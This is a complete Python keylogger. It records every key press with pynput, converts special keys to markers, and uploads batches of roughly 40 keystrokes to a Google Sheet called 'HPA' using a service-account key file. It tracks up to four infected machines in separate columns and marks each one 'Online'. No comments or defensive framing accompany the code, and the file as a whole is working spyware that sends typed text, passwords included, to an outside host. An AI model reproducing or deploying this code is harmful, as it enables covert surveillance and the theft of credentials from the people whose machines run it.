import pynput
import gspread
from oauth2client.service_account import ServiceAccountCredentials

from pynput.keyboard import Key, Listener

scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('sheets.json', scope)
client = gspread.authorize(creds)

sheet = client.open('HPA').sheet1

if sheet.cell(1, 1).value == '':
    current_cell = 2
    current_row = 1

elif sheet.cell(1, 2).value == '':
    current_cell = 2
    current_row = 2

elif sheet.cell(1, 3).value == '':
    current_cell = 2
    current_row = 3

elif sheet.cell(1, 4).value == '':
    current_cell = 2
    current_row = 4

else:
    quit()

sheet.update_cell(1, current_row, 'Online')

keys = []

def on_press(key):
    global keys
    keys.append(key)
    if len(keys) > 40:
        write_out()
        keys = []

def filter_spaces(character):
    if character == Key.space:
        return ' '

    elif character == Key.enter:
        return '/ENTER/'
    elif character == Key.shift:
        return '/SHIFT/'
    elif character == Key.backspace:
        return '/BCK/'
    elif character == Key.tab or character == Key.alt_r or character == Key.alt_l or character == Key.ctrl_l or character == Key.ctrl_r:
        return ''
    else:
        return character

def write_out():
    global keys, current_cell, current_row
    keys = list(map(filter_spaces, keys))
    keys = list(map(str, keys))

    output = ''.join(keys).replace("'", '')

    sheet.update_cell(current_cell, current_row, output)
    current_cell += 1
    
def on_release(key):
    pass

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()